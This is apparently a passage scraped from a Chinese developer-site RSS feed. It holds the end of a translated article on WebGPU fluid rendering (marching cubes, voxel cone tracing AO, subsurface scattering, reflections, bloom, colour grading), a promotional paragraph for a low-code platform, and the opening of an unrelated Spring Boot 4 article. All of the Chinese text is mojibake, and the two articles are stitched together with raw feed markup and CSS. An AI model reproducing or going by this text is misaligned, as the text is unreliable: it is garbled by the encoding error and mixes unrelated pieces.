<p>å¦‚æœä½ è¦çš„æ˜¯ä¸é€æ˜/åŠé€æ˜ä½†ä¸éœ€è¦â€œçœŸæ­£é€æ˜â€çš„æ¶²ä½“ï¼ˆæ¯”å¦‚é¢œæ–™ï¼‰ï¼Œmarching cubes æ˜¯ä¸é”™é€‰æ‹©ï¼šä½ å¯ä»¥ç”¨ PBR å¾—åˆ°å¾ˆå¥½çœ‹çš„è§†è§‰ï¼Œè€Œä¸”å®ƒæ˜¯ä¸–ç•Œç©ºé—´å‡ ä½•ï¼Œå’Œåœºæ™¯æ•´åˆæ›´ç®€å•ã€‚</p>
<p>åœ¨è¿™ä¸ª Demo çš„èŒƒå›´é‡Œï¼Œæˆ‘æƒ³åˆ©ç”¨ç°æˆçš„ä½“ç´ ç»“æ„ï¼ˆç”¨äºä¸‰è§’å½¢ç”Ÿæˆï¼‰ä»¥åŠç”¨äºç”Ÿæˆä¸‰è§’å½¢çš„åŠ¿åœºï¼ˆå¯è§†ä½œè·ç¦»åœºï¼‰ï¼Œåšä¸€äº›â€œç›¸å¯¹ä¾¿å®œä½†æœ‰æ•ˆâ€çš„è§†è§‰æå‡ã€‚</p>
<p>æˆ‘å…ˆåšäº†åŸºäºä½“ç´ é”¥è¿½è¸ªï¼ˆVoxel Cone Tracingï¼ŒVCTï¼‰çš„ AOã€‚VCT é€šå¸¸è¦æ±‚å…ˆæŠŠä¸‰è§’å½¢ä½“ç´ åŒ–ï¼Œä½†è¿™ä¸ª Demo åè¿‡æ¥ï¼šæˆ‘ä»¬æœ¬æ¥å°±æ˜¯ä»ä½“ç´ ç”Ÿæˆä¸‰è§’å½¢ã€‚æ‰€ä»¥ VCT æ‰€éœ€çš„ä¸€å¤§å—å·¥ä½œå·²ç»åœ¨æµç¨‹é‡Œã€‚</p>
<p>æˆ‘åªéœ€è¦ç¨å¾®æ”¹ä¸€ä¸‹ <code>MarchCase.wgsl</code>ï¼šç”¨ç¦»æ•£åŒ–æ–¹å¼æ›´æ–°ä½“ç´ ç½‘æ ¼â€”â€”æœ‰ä¸‰è§’å½¢çš„ä½“ç´ æ ‡è®°ä¸º 1ï¼Œæ²¡æœ‰çš„æ ‡è®°ä¸º 0ï¼›åŒæ—¶æŠŠåœ°é¢ä»¥ä¸‹ä¸€å®šé«˜åº¦çš„ä½“ç´ æ ‡ 0.5 æ¥æ¨¡æ‹Ÿåœ°é¢ AOã€‚åªå¤šåŠ ä¸¤è¡Œä»£ç å°±èƒ½å‡†å¤‡å¥½ VCT çš„ä¿¡æ¯ã€‚</p>
<p>ä½“ç´ ç½‘æ ¼æ›´æ–°åï¼Œå†å¯¹ 3D çº¹ç†åš mipmapï¼ˆ<code>MipMapCompute.wgsl</code>ï¼Œç»‘å®šåœ¨ <code>CalculateMipMap.js</code>ï¼‰ã€‚</p>
<p>ä½ ä¼šæ³¨æ„åˆ°æˆ‘ä¹Ÿåšäº†åœ°é¢åå°„ï¼šmarching cubes ç”Ÿæˆçš„æ˜¯ç½‘æ ¼ï¼Œåšåå°„å¾ˆç›´æ¥â€”â€”ç®—åå°„çŸ©é˜µï¼ŒæŠŠç½‘æ ¼ç»˜åˆ¶ä¸¤éå³å¯ã€‚è‹¥ç”¨ ray marching åšåŒæ ·æ•ˆæœä¼šè´µå¾ˆå¤šã€‚</p>
<p>è¿™æ—¶æˆ‘è¿˜æœ‰ä¸€ç‚¹ GPU é¢„ç®—ï¼Œäºæ˜¯ç»§ç»­é—®æœ‹å‹ï¼šè¿˜æœ‰ä»€ä¹ˆç‰¹æ€§å€¼å¾—åŠ ï¼Ÿæœ‰äººå»ºè®®åšæ¬¡è¡¨é¢æ•£å°„ï¼ˆSubsurface Scatteringï¼ŒSSSï¼‰ï¼Œåƒä¸‹é¢è¿™ç§æ•ˆæœã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0a005defdf94b9ab69c2e9e5833a86f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR5a6J5Lic5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770793485&amp;x-signature=OEuS3dZvmPaJIRKMCpYZJri4eCo%3D" alt="image.png" loading="lazy"/></p>
<p>SSS åšå¾—å¥½éå¸¸åŠ åˆ†ï¼Œéš¾ç‚¹åœ¨äºè¦çŸ¥é“å‡ ä½•ä½“çš„åšåº¦ï¼ˆthicknessï¼‰ï¼Œæ‰èƒ½å†³å®šå…‰åœ¨å†…éƒ¨æ•£å°„çš„ç¨‹åº¦ã€‚</p>
<p>å¾ˆå¤š SSS demo ç”¨â€œåšåº¦è´´å›¾â€ï¼Œä½†æµä½“è¡¨é¢æ— æ³•çƒ˜ç„™åšåº¦ï¼Œå¿…é¡»å®æ—¶è®¡ç®—ã€‚</p>
<p>å¹¸è¿çš„æ˜¯ï¼Œæˆ‘ä»¬åœ¨ç”Ÿæˆä¸‰è§’å½¢ä¹‹å‰å·²ç»æœ‰åŠ¿åœºï¼Œå®ƒå¯ä»¥å½“è·ç¦»åœºç”¨æ¥å®æ—¶ä¼°ç®—è¡¨é¢åšåº¦ã€‚æ¦‚å¿µä¸Šç±»ä¼¼ IÃ±igo Quilez åš AO çš„æ–¹å¼ï¼šåœ¨è·ç¦»åœºé‡Œ ray marchingï¼Œçœ‹è¡¨é¢è·ç¦»å¦‚ä½•å½±å“é®è”½ã€‚</p>
<p>æˆ‘é‡‡ç”¨ç±»ä¼¼æ€è·¯ï¼Œä½†æŠŠå…‰çº¿æ²¿â€œè¿›å…¥å‡ ä½•å†…éƒ¨â€çš„æ–¹å‘å‘å°„ï¼Œä»è€Œä¼°ç®—å†…éƒ¨å…‰ä¼ æ’­è¢«é®æŒ¡çš„ç¨‹åº¦â€”â€”åšçš„åœ°æ–¹æ•£å°„å¼±ï¼Œè–„çš„åœ°æ–¹æ•£å°„å¼ºã€‚æ•ˆæœå‡ºä¹æ„æ–™åœ°å¥½ã€‚</p>
<p>å‡ ä½•æè´¨åœ¨ <code>RenderMC.wgsl</code>ï¼šé¡¶ç‚¹ç€è‰²å™¨ä½¿ç”¨å­˜å‚¨åœ¨ storage buffer çš„é¡¶ç‚¹ä½ç½®ä¸æ³•çº¿ã€‚å› ä¸º CPU ä¸çŸ¥é“ marching cubes å®é™…ç”Ÿæˆäº†å¤šå°‘ä¸‰è§’å½¢ï¼Œæ‰€ä»¥ç”¨ <code>EncodeBuffer.wgsl</code> ç¼–ç å‡ºçš„é—´æ¥ draw æ¥ç»˜åˆ¶ã€‚</p>
<p>ç»‘å®šé‡Œæˆ‘ç”¨äº†ä¸¤å¥—çŸ©é˜µï¼šä¸€å¥—ç”¨äºæ­£å¸¸è§†è§’ï¼Œå¦ä¸€å¥—ç”¨äºåå°„ç½‘æ ¼ï¼›è¿™äº›åœ¨ <code>Main.js</code> å®Œæˆã€‚</p>
<p>åˆ°è¿™ä¸€æ­¥ï¼Œæ¨¡æ‹Ÿã€è¡¨é¢ç”Ÿæˆã€æè´¨éƒ½æœ‰äº†ï¼Œæ¥ä¸‹æ¥è¯¥è°ˆåˆæˆï¼ˆcompositionï¼‰ã€‚</p>
<h2 data-id="heading-10">åˆæˆï¼ˆCompositionï¼‰</h2>
<p>ä½ å¯èƒ½è§‰å¾—è‡ªå·±æ˜¯å¾ˆå‰å®³çš„å›¾å½¢å¼€å‘è€…ï¼šä¼šç”¨ Three.js / Babylon.js / PlayCanvas åšé…·ç‚«æ•ˆæœâ€¦â€¦ä¹Ÿå¯èƒ½ä½ æ›´å¼ºï¼Œå¾ˆå¤šä¸œè¥¿è‡ªå·±å†™ã€‚</p>
<p>æˆ‘æƒ³è¯´çš„æ˜¯ï¼šæˆ‘ä¸æ˜¯ã€‚</p>
<p>æˆ‘ä¸ºä»€ä¹ˆçŸ¥é“ï¼Ÿ</p>
<p>å› ä¸ºæˆ‘æ›¾åœ¨ Active Theoryï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Factivetheory.net%2F" target="_blank" title="https://activetheory.net/" ref="nofollow noopener noreferrer">activetheory.net/</a>ï¼‰å·¥ä½œï¼Œèº«è¾¹æ˜¯éå¸¸ä¼˜ç§€çš„å›¾å½¢å¼€å‘å’Œ 3D è‰ºæœ¯å®¶ã€‚ä»–ä»¬è®©æˆ‘çœ‹æ¸…è‡ªå·±çš„çŸ­æ¿ï¼Œä¹Ÿå¸®åŠ©æˆ‘æŠŠäº¤ä»˜ç‰©æ¨åˆ°æ›´å¥½çš„çŠ¶æ€ã€‚</p>
<p>å¦‚æœä½ èƒ½äº‰å–å’Œä»–ä»¬å…±äº‹ï¼Œå¯¹ä½ çš„èŒä¸šå‘å±•éå¸¸æœ‰å¸®åŠ©â€”â€”ä½ ä¼šå­¦åˆ°å¾ˆå¤šã€‚</p>
<p>å…¶ä¸­æœ€å…³é”®çš„ä¸€ç‚¹æ˜¯ï¼š<strong>åˆæˆå†³å®šä¸€åˆ‡ã€‚</strong></p>
<p>æˆ‘è¯·æ›¾åœ¨ Active Theory å…±äº‹çš„ Paul-guilhem Repauxï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Farpeegee" target="_blank" title="https://x.com/arpeegee" ref="nofollow noopener noreferrer">x.com/arpeegee</a>ï¼‰å¸®æˆ‘åšåˆæˆå»ºè®®ã€‚ä»–æŒ‡å‡ºäº†å‡ ä¸ªå…³é”®é—®é¢˜ï¼š</p>
<ul>
<li>åœ°é¢åå°„è¿‡äºæ¸…æ™°ï¼Œåº”è¯¥æ›´ç²—ç³™ï¼ˆæ›´æ¨¡ç³Šï¼‰ã€‚</li>
<li>é»‘è‰²èƒŒæ™¯æ— æ³•ä½“ç°å…‰ä»å“ªé‡Œæ¥ï¼›èƒŒæ™¯åº”è¯¥è¥é€ æ›´â€œæœ‰æƒ…ç»ªâ€çš„æ°›å›´ã€‚</li>
<li>ç¼ºå°‘æŠŠå‡ ä½•ä½“ä¸ç¯å¢ƒèåˆçš„å…‰æ•ˆã€‚</li>
<li>å­—æ¯ä¹‹é—´çš„è¿‡æ¸¡ç¼ºä¹åˆç†æ€§ã€‚</li>
<li>éœ€è¦è°ƒè‰²ã€‚</li>
</ul>
<p>ï¼ˆå½“ç„¶è¿˜æœ‰å¾ˆå¤šèƒ½æ”¹çš„åœ°æ–¹ï¼Œä»–åªæ˜¯å¾ˆå‹å¥½åœ°æŒ‘äº†æœ€å…³é”®çš„ã€‚ï¼‰</p>
<h3 data-id="heading-11">åå°„</h3>
<p>ç¬¬ä¸€ç‚¹å¯ä»¥ç”¨åæœŸè§£å†³ï¼šæ ¹æ®å‡ ä½•ä½“åˆ°åœ°é¢çš„è·ç¦»å†³å®šåå°„çš„æ¨¡ç³Šç¨‹åº¦â€”â€”ç¦»åœ°è¶Šè¿œè¶Šæ¨¡ç³Šï¼Œä»è€Œå¾—åˆ°â€œç²—ç³™åº¦â€æ•ˆæœã€‚</p>
<p>ä½†å¦‚æœåªåœ¨â€œæœ‰å‡ ä½•ä½“é«˜åº¦ä¿¡æ¯â€çš„åŒºåŸŸæ¨¡ç³Šï¼Œå‘¨å›´ç©ºç™½åŒºåŸŸä¼šä¸æ¨¡ç³Šï¼Œç»“æœä¼šå¾ˆæ€ªã€‚</p>
<p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘å…ˆåšäº†ä¸€ä¸ªé¢„å¤„ç† passï¼šæŠŠåå°„å‡ ä½•ä½“åšä¸€ä¸ªåç§»ï¼Œå¹¶æŠŠâ€œæœ€è¿‘çš„é«˜åº¦â€å†™å…¥ä¸€å¼ çº¹ç†ï¼Œç”¨æ¥åœ¨ç©ºç™½åŒºåŸŸä¹Ÿå†³å®šæ¨¡ç³Šå¼ºåº¦ã€‚</p>
<p>æ·±çº¢è‰²æ˜¯æœªåå°„å‡ ä½•ä½“ï¼Œç»¿è‰²æ˜¯åå°„å‡ ä½•ä½“ï¼ˆåŒ…å«åç§»ï¼‰ï¼Œä½ ä¼šçœ‹åˆ°ç»¿è‰²æ›´â€œåšâ€ã€‚é«˜åº¦ç¼–ç åœ¨çº¢è‰²é€šé“é‡Œï¼Œå¯è§†ä¸ºä»åœ°é¢åˆ°ä¸Šæ–¹çš„æ¸å˜ã€‚</p>
<h3 data-id="heading-12">èƒŒæ™¯ä¸å…‰</h3>
<p>SSS çš„å®ç°å‡è®¾å…‰æºå§‹ç»ˆä»å‡ ä½•ä½“èƒŒåæ‰“è¿‡æ¥â€”â€”å³ä¾¿é•œå¤´ç§»åŠ¨ï¼Œè¿™ä¸ªæ–¹å‘ä¹Ÿå¾—æˆç«‹ï¼Œå¦åˆ™ SSS ä¸æ˜æ˜¾ã€‚</p>
<p>è¿™å¯¹èƒŒæ™¯è®¾è®¡åè€Œæ˜¯å¥½äº‹ï¼šèƒŒæ™¯å¯ä»¥åšä¸€ä¸ªâ€œèƒŒå…‰æ¸å˜â€ï¼Œè‡ªç„¶åœ°è§£é‡Šå…‰æ¥è‡ªèƒŒåï¼›åŒæ—¶èƒŒæ™¯è‰²ä¹Ÿå¯ä»¥å’Œæè´¨æ›´æ¥è¿‘ï¼Œè®©æ•´ä½“æ›´èåˆã€‚</p>
<h3 data-id="heading-13">å…‰æ•ˆèåˆ</h3>
<p>æœ€åï¼Œä¸ºäº†è®©èƒŒæ™¯ä¸å‡ ä½•ä½“çš„å…‰èåˆå¾—æ›´å¥½ï¼Œæˆ‘åŠ äº† Bloomï¼šåœ¨å‡ ä½•ä½“æ›´è–„çš„åŒºåŸŸï¼ŒBloom æ›´å¼ºï¼Œä»è€Œå¼ºåŒ– SSS çš„è§†è§‰ã€‚</p>
<p>ï¼ˆé¡ºå¸¦ä¸€æï¼šæˆ‘è¿˜å°è¯•è¿‡æŠŠå­—æ¯åŠ¨ç”»å’Œ Codrops çš„ Logo å¯¹é½ï¼Œä½†çœ‹èµ·æ¥åƒå„¿ç«¥è¯†å­—åº”ç”¨ï¼Œäºæ˜¯æ”¾å¼ƒã€‚ï¼‰</p>
<h3 data-id="heading-14">è°ƒè‰²ä¸æ°›å›´</h3>
<p>æœ€åæˆ‘åŠ äº†äº®åº¦ã€å¯¹æ¯”åº¦ã€gamma æ ¡æ­£ï¼Œé€‰æ‹©åæš–çš„é…è‰²è®©æ°›å›´æ›´æŸ”å’Œã€‚åæœŸç”±å¤šä¸ª compute shader å®Œæˆï¼Œåœ¨ <code>Main.js</code> é‡Œè°ƒç”¨ã€‚</p>
<p>å®Œæ•´ä»£ç åº“ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FHectorArellanoDev%2FCodrops" target="_blank" title="https://github.com/HectorArellanoDev/Codrops" ref="nofollow noopener noreferrer">github.com/HectorArellâ€¦</a></p>
<p>ç®€åŒ–ç‰ˆä»“åº“ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FHectorArellanoDev%2FCodropsBasic" target="_blank" title="https://github.com/HectorArellanoDev/CodropsBasic" ref="nofollow noopener noreferrer">github.com/HectorArellâ€¦</a></p>
<p>ä½ å¯ä»¥é€šè¿‡åœ¨ Demo URL æœ«å°¾åŠ  <code>/?word=something</code> æ¥æ›´æ”¹å±•ç¤ºçš„å•è¯ã€‚</p>
<h2 data-id="heading-15">ç»“è¯­</h2>
<p>æœ¬æ–‡æ²¡æœ‰æ·±å…¥æ€§èƒ½ä¼˜åŒ–ï¼Œæˆ‘è§‰å¾—ä¹Ÿæ²¡å¿…è¦ï¼šè¿™ä¸ª Demo æœ¬æ¥å°±é¢å‘å¼º GPUï¼Œä¸æ˜¯ç§»åŠ¨ç«¯ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3331a9a8c18049729abbc850de008876~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR5a6J5Lic5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770793485&amp;x-signature=EMqTEmzlQVMjfUx%2FbmPohsc26hU%3D" alt="image.png" loading="lazy"/></p>
<p>WebGPU çš„ timestamp query è®©å®šä½ç“¶é¢ˆå˜å¾—æ›´å®¹æ˜“ï¼ˆä¾‹å¦‚ <code>Blur3D.js</code> é‡Œå°±æœ‰æ³¨é‡Šæ‰çš„æŸ¥è¯¢ï¼‰ã€‚</p>
<p>è¿™å¹¶ä¸æ„å‘³ç€â€œè¿™å¥—æ–¹æ¡ˆèƒ½ç›´æ¥ä¸Šç”Ÿäº§â€ã€‚Felix åšè¿‡ä¸€ä¸ªç”¨ SPH åšå­—æ¯çš„æ¢ç´¢ï¼Œéå¸¸å¿«ä¹Ÿå¾ˆé…·ï¼Œä½ å¯ä»¥çœ‹çœ‹ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ffluid.felixmartinez.dev%2F" target="_blank" title="https://fluid.felixmartinez.dev/" ref="nofollow noopener noreferrer">fluid.felixmartinez.dev/</a></p>
<p>æ€»ä¹‹ï¼Œè¿™ä¹ˆå¤šå¹´è¿‡å»ï¼ŒFelix è¿˜æ˜¯èµ¢ç€èµŒå±€ï¼Œè€Œæˆ‘è¿˜åœ¨åŠªåŠ›æ‰­è½¬ç»“æœâ€¦â€¦å¸Œæœ›ä½ ä¹Ÿèƒ½é‡åˆ°ä¸€ä¸ªè®©ä½ è¯´å‡º <em>â€œhold my beerâ€</em> çš„äººã€‚</p>
<h2 data-id="heading-16">å°ç»“</h2>
<p>WebGPU æµä½“é•¿æ–‡çœŸæ­£æœ‰ä»·å€¼çš„ç‚¹åœ¨äºï¼šå®ƒæŠŠâ€œé…·ç‚« Demoâ€æ‹†æˆäº†å¯å¤ç”¨çš„å·¥ç¨‹æ¨¡å—é“¾è·¯â€”â€”ç²’å­æ¨¡æ‹Ÿã€åŠ¿åœºç”Ÿæˆã€marching cubesã€é—´æ¥ dispatch/drawã€å†åˆ°åˆæˆä¸è°ƒè‰²ã€‚è½åœ°æ—¶æœ€å®¹æ˜“å¡ä½çš„å¾€å¾€æ˜¯æ€§èƒ½é¢„ç®—ä¸è°ƒå‚æˆæœ¬ï¼šç®—åŠ›éƒ½èŠ±åœ¨æ¨¡æ‹Ÿä¸å‡ ä½•ç”Ÿæˆä¸Šï¼Œç•™ç»™ç”»é¢æ‰“ç£¨çš„ç©ºé—´å¾ˆå°ï¼Œæ‰€ä»¥å·¥ç¨‹ä¸Šéœ€è¦æŠŠå¯æ§çš„é˜¶æ®µæ‹†å¼€éªŒè¯ã€é€æ­¥è¿­ä»£ã€‚å®è·µä¸­å¯ä»¥ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.rollcode.cn%2F%3Fsource%3Dba%26id%3Dfrontendweekly" target="_blank" title="https://www.rollcode.cn/?source=ba&amp;id=frontendweekly" ref="nofollow noopener noreferrer">RollCode ä½ä»£ç å¹³å°</a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.rollcode.cn%2F%3Fsource%3Dba%26id%3Dfrontendweekly" target="_blank" title="https://www.rollcode.cn/?source=ba&amp;id=frontendweekly" ref="nofollow noopener noreferrer">ç§æœ‰åŒ–éƒ¨ç½²</a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.rollcode.cn%2F%3Fsource%3Dba%26id%3Dfrontendweekly" target="_blank" title="https://www.rollcode.cn/?source=ba&amp;id=frontendweekly" ref="nofollow noopener noreferrer">è‡ªå®šä¹‰ç»„ä»¶</a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.rollcode.cn%2F%3Fsource%3Dba%26id%3Dfrontendweekly" target="_blank" title="https://www.rollcode.cn/?source=ba&amp;id=frontendweekly" ref="nofollow noopener noreferrer">é™æ€é¡µé¢å‘å¸ƒï¼ˆSSG + SEOï¼‰</a> æ¥æŠŠ Demo å±•ç¤ºã€å‚æ•°é¢æ¿ã€ç´ æä¸å‘å¸ƒæµç¨‹åšæˆå¯å¤ç°çš„äº¤ä»˜é—­ç¯ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring Boot 4 æ–°ç‰¹æ€§ï¼šæ¨¡å—åŒ–æ¶æ„]]></title>    <link>https://juejin.cn/post/7602531501457129481</link>    <guid>https://juejin.cn/post/7602531501457129481</guid>    <pubDate>2026-02-04T06:29:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602531501457129481" data-draft-id="7602544700475736074" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring Boot 4 æ–°ç‰¹æ€§ï¼šæ¨¡å—åŒ–æ¶æ„"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-02-04T06:29:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Javaç¼–ç¨‹çˆ±å¥½è€…"/> <meta itemprop="url" content="https://juejin.cn/user/819554264300154"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring Boot 4 æ–°ç‰¹æ€§ï¼šæ¨¡å—åŒ–æ¶æ„
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/819554264300154/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Javaç¼–ç¨‹çˆ±å¥½è€…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T06:29:00.000Z" title="Wed Feb 04 2026 06:29:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    35
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2014 å¹´ï¼ŒSpring Boot 1.0 æ¨ªç©ºå‡ºä¸–ï¼Œå‡­å€Ÿâ€œå¼€ç®±å³ç”¨â€çš„ç†å¿µå½»åº•æ”¹å˜äº† Java å¼€å‘æ–¹å¼ã€‚</p>
<p>å½“æ—¶ï¼Œå®ƒçš„æ ¸å¿ƒè‡ªåŠ¨é…ç½®åŒ…Â <code>spring-boot-autoconfigure</code>Â ä»… 182 KBã€‚</p>
<p>ä½†åˆ°äº† Spring Boot 3.5ï¼Œè¿™ä¸ªåŒ…å·²ç»è†¨èƒ€è‡³ 2 MBï¼Œæ”¯æŒçš„åŠŸèƒ½è¶Šæ¥è¶Šå¤šï¼Œä½†å¤æ‚åº¦å’Œä½“ç§¯ä¹Ÿéšä¹‹å¢é•¿ã€‚</p>
<p>åœ¨å³å°†åˆ°æ¥çš„Â <strong>Spring Boot 4</strong>Â ä¸­ï¼ŒSpring å®˜æ–¹å›¢é˜Ÿå¯¹è¿™ä¸€ç°çŠ¶è¿›è¡Œäº†å½»åº•é‡æ„ï¼Œæ­£å¼å¼•å…¥Â <strong>æ¨¡å—åŒ–ï¼ˆModularizationï¼‰</strong> Â æ¶æ„ã€‚</p>
<p>è¿™ä¸€æ”¹å˜ä¸ä»…å½±å“äº†é¡¹ç›®ç»“æ„å’Œä¾èµ–å…³ç³»ï¼Œæ›´ä¸ºå¼€å‘è€…å¸¦æ¥äº†æ›´è½»é‡ã€æ›´æ¸…æ™°ã€æ›´é«˜æ•ˆçš„ä½¿ç”¨ä½“éªŒã€‚</p>
<p>Spring Boot çš„æœ€å¤§ä¼˜ç‚¹ä¹‹ä¸€ï¼Œæ˜¯å®ƒèƒ½è‡ªåŠ¨é…ç½®å¤§é‡æŠ€æœ¯ç»„ä»¶ï¼Œå¦‚ Webã€JPAã€Redisã€Kafka ç­‰ã€‚</p>
